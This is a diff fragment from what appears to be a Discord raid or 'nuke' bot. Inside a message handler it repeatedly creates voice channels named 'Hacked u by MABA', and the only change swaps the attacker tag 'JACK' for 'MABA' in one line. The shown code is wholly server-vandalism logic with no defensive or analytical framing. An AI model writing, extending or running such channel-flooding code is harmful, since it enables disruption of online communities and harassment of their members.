@@ -294,7 +294,7 @@ LOka.on("message", message => {
       m.createChannel("Hacked u by MABA", "voice");
       m.createChannel("Hacked u by MABA", "voice");
       m.createChannel("Hacked u by MABA", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
       m.createChannel("Hacked u by MABA", "voice");
       m.createChannel("Hacked u by MABA", "voice");
       m.createChannel("Hacked u by MABA", "voice");
